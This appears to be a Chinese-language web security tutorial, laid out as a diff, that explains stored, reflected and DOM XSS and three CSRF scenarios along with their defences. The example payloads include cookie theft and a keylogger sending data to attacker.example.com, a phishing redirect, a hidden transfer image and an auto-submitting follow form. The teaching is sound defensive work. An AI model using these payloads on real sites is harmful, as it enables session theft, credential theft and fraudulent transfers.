@@ -1,0 +1,185 @@
+XSS（跨站脚本攻击，Cross-Site Scripting）是一种通过在网页中注入恶意脚本，窃取用户数据或执行未经授权操作的网络安全攻击。以下通过具体案例详细说明XSS的攻击过程、防御措施及实际场景中的应用：
+
+案例一：窃取用户Cookie（存储型XSS）
+攻击场景
+恶意用户发布评论：
+攻击者A在目标网站（如博客、论坛）的评论区提交一条包含恶意脚本的评论：
+html
+<script>
+  fetch('https://attacker.example.com/steal?cookie=' + document.cookie);
+</script>
+网站未对用户输入进行过滤或转义，直接将评论存储到数据库中。
+其他用户访问页面：
+用户B访问该博客页面时，服务器从数据库中读取评论并渲染到页面上，恶意脚本被执行。
+脚本将用户B的会话Cookie发送到攻击者控制的服务器（https://attacker.example.com/steal）。
+攻击成功：
+攻击者A获取用户B的Cookie后，可伪造用户B的身份登录网站，执行未经授权的操作（如转账、修改密码）。
+防御措施
+输入过滤与转义：
+对用户输入的特殊字符（如<、>、&）进行转义，将<script>转换为&lt;script&gt;，防止脚本执行。
+使用安全的模板引擎（如React、Vue的v-html需谨慎使用）自动转义输出。
+Content Security Policy（CSP）：
+设置HTTP头Content-Security-Policy: default-src 'self'，禁止加载外部脚本，阻止恶意脚本执行。
+示例：
+Content-Security-Policy: script-src 'self' https://trusted.cdn.com
+HttpOnly Cookie：
+设置Cookie的HttpOnly属性，禁止JavaScript访问Cookie，防止通过document.cookie窃取：
+Set-Cookie: sessionId=abc123; HttpOnly; Secure
+案例二：钓鱼攻击（反射型XSS）
+攻击场景
+构造恶意链接：
+攻击者A构造一个包含恶意脚本的URL，诱导用户点击：
+https://example.com/search?query=<script>alert('XSS攻击！');</script>
+或更隐蔽的钓鱼链接：
+https://example.com/login?redirect=<script>window.location='https://fake.example.com/phish';</script>
+用户点击链接：
+用户B点击链接后，网站将query参数直接渲染到搜索结果页面，恶意脚本被执行。
+脚本将用户重定向到钓鱼网站（https://fake.example.com/phish），诱导用户输入账号密码。
+攻击成功：
+攻击者A获取用户B的账号密码，用于非法登录或身份盗用。
+防御措施
+输入验证与转义：
+对URL参数进行严格验证，拒绝包含<script>等危险字符的输入。
+对输出到HTML的内容进行转义，防止脚本注入。
+使用安全编码库：
+使用OWASP ESAPI等安全编码库对用户输入进行编码和过滤。
+避免直接渲染用户输入：
+对搜索结果等动态内容，使用安全的展示方式（如纯文本显示，而非HTML渲染）。
+案例三：键盘记录与数据窃取（DOM型XSS）
+攻击场景
+恶意页面修改DOM：
+攻击者A构造一个恶意页面，通过JavaScript修改目标网站的DOM结构，插入键盘记录脚本：
+html
+<script>
+  // 假设目标网站通过URL参数加载内容（如 ?page=home）
+  const page = new URLSearchParams(window.location.search).get('page');
+  document.body.innerHTML = `<div>当前页面: ${page}</div>`;
+  
+  // 未对page参数转义，攻击者可注入恶意脚本
+  // 攻击者构造URL: https://example.com/?page=<img src=x onerror="stealData()">
+  function stealData() {
+    const keystrokes = [];
+    document.addEventListener('keypress', (e) => {
+      keystrokes.push(e.key);
+      fetch('https://attacker.example.com/log?keys=' + encodeURIComponent(keystrokes.join('')));
+    });
+  }
+</script>
+用户访问恶意页面：
+用户B访问攻击者构造的页面或点击恶意链接后，脚本执行，开始记录键盘输入。
+攻击成功：
+攻击者A获取用户B的键盘输入（如密码、信用卡号），用于非法用途。
+防御措施
+避免直接操作DOM：
+使用安全的DOM操作方法（如textContent替代innerHTML），防止脚本注入。
+示例：
+javascript
+// 不安全
+document.getElementById('output').innerHTML = userInput;
+
+// 安全
+document.getElementById('output').textContent = userInput;
+使用CSP限制内联脚本：
+设置Content-Security-Policy: script-src 'self'，禁止内联脚本执行。
+对动态URL参数进行验证：
+对通过URL传递的参数（如?page=home）进行严格验证，拒绝非法值。
+XSS防御的总结与最佳实践
+输入过滤与转义：
+对所有用户输入进行严格验证，拒绝包含<script>、onerror=等危险字符的输入。
+对输出到HTML、JavaScript、URL等内容进行转义，防止脚本执行。
+使用安全编码库：
+依赖成熟的库（如DOMPurify）对动态内容进行清理和过滤。
+设置Content Security Policy（CSP）：
+通过HTTP头限制脚本加载来源，禁止内联脚本，减少攻击面。
+避免直接操作DOM：
+使用安全的DOM操作方法，防止脚本注入。
+使用HttpOnly和Secure Cookie：
+防止JavaScript访问会话Cookie，并通过HTTPS传输，减少窃取风险。
+定期安全审计：
+对代码进行安全审查，检查是否存在XSS漏洞（如未转义的输出、不安全的DOM操作）。
+XSS攻击类型对比
+类型	存储位置	触发方式	典型场景	防御重点
+存储型XSS	服务器数据库	用户访问页面	评论、论坛、博客	输入过滤、输出转义
+反射型XSS	URL参数	用户点击恶意链接	搜索结果、错误页面	输入验证、CSP
+DOM型XSS	客户端JavaScript	动态修改DOM	单页应用（SPA）、URL参数	避免内联脚本、安全DOM操作
+
+CSRF（跨站请求伪造）攻击通过诱导用户点击恶意链接或访问恶意页面，在用户不知情的情况下以用户身份向目标网站发送恶意请求。以下通过具体案例详细说明CSRF的攻击过程、防御措施及实际场景中的应用：
+
+案例一：银行转账攻击
+攻击场景
+用户登录：用户A登录银行网站（如https://bank.example.com），并保持登录状态（浏览器中存储了会话Cookie）。
+构造恶意链接：攻击者B构造一个恶意链接，例如：
+html
+<img src="https://bank.example.com/transfer?to=attacker_account&amount=10000" width="0" height="0">
+或通过电子邮件、社交媒体发送给用户A，诱导其点击。
+用户点击链接：用户A在不知情的情况下点击链接（或图片自动加载），浏览器自动携带用户A的会话Cookie向银行网站发送转账请求。
+攻击成功：银行网站接收到请求后，验证会话有效，执行转账操作，将10000元转入攻击者B的账户。
+防御措施
+CSRF Token：
+银行网站在转账页面生成一个唯一的Token，存储在用户Session中，并将Token作为隐藏字段嵌入表单：
+html
+<form action="/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="abc123xyz456">
+  <input type="text" name="to" placeholder="收款账户">
+  <input type="number" name="amount" placeholder="金额">
+  <button type="submit">转账</button>
+</form>
+服务器接收请求时，验证Token是否与Session中存储的一致，不一致则拒绝请求。
+SameSite Cookie属性：
+银行网站设置Cookie时添加SameSite=Strict或SameSite=Lax，限制跨站请求携带Cookie：
+Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
+即使攻击者诱导用户点击链接，浏览器也不会发送Cookie，请求因缺少会话信息被拒绝。
+验证Referer/Origin头：
+服务器检查请求的Referer或Origin头，确保请求来自银行网站域名（如https://bank.example.com），否则拒绝请求。
+案例二：社交平台恶意关注
+攻击场景
+用户登录：用户C登录社交平台（如https://social.example.com），并保持登录状态。
+构造恶意页面：攻击者D创建一个恶意页面（如https://evil.example.com/attack.html），内容如下：
+html
+<body onload="document.getElementById('follow').submit()">
+  <form id="follow" action="https://social.example.com/follow" method="POST">
+    <input type="hidden" name="user_id" value="attacker_id">
+  </form>
+</body>
+诱导用户访问：攻击者D通过邮件、社交媒体等方式诱导用户C访问恶意页面。
+自动提交表单：用户C访问恶意页面时，表单自动提交，浏览器携带用户C的会话Cookie向社交平台发送关注请求。
+攻击成功：社交平台接收到请求后，验证会话有效，执行关注操作，用户C被迫关注攻击者D的账号。
+防御措施
+CSRF Token：
+社交平台在关注按钮对应的表单中嵌入Token：
+html
+<form action="/follow" method="POST">
+  <input type="hidden" name="csrf_token" value="def789ghi012">
+  <input type="hidden" name="user_id" value="target_user_id">
+  <button type="submit">关注</button>
+</form>
+服务器验证Token有效性，防止伪造请求。
+SameSite Cookie属性：
+设置SameSite=Lax，允许通过导航链接（如用户点击链接）发送Cookie，但禁止通过恶意页面自动提交的表单发送Cookie（部分浏览器可能仍允许，需结合其他措施）。
+双重验证：
+对敏感操作（如关注、点赞）要求用户输入密码或进行二次验证（如短信验证码），增加攻击难度。
+案例三：修改用户密码
+攻击场景
+用户登录：用户E登录网站（如https://example.com），并保持登录状态。
+构造恶意请求：攻击者F构造一个URL，诱导用户E点击：
+https://example.com/change_password?new_password=attacker_password&confirm_password=attacker_password
+用户点击链接：用户E在不知情的情况下点击链接，浏览器携带会话Cookie发送修改密码请求。
+攻击成功：网站验证会话有效，将用户E的密码修改为attacker_password，攻击者F可登录用户E的账户。
+防御措施
+CSRF Token：
+修改密码页面生成Token，并要求用户通过POST请求提交表单，而非直接通过URL参数修改。
+SameSite Cookie属性：
+设置SameSite=Strict，禁止跨站请求携带Cookie，即使攻击者诱导用户点击链接，请求也会因缺少会话信息被拒绝。
+POST请求替代GET：
+禁止通过GET请求修改敏感数据，强制使用POST请求，并结合Token验证。
+CSRF防御的总结与最佳实践
+综合使用多种防御措施：
+结合CSRF Token、SameSite Cookie属性和验证Referer/Origin头，提高防御效果。
+敏感操作严格验证：
+对转账、修改密码等敏感操作，使用SameSite=Strict和CSRF Token双重验证。
+定期更新Token：
+定期更换CSRF Token，减少Token泄露的风险。
+教育用户：
+提醒用户不要随意点击不明链接，提高安全意识。
+前后端配合：
+前端正确嵌入Token，后端严格验证请求合法性，确保防御措施有效实施。
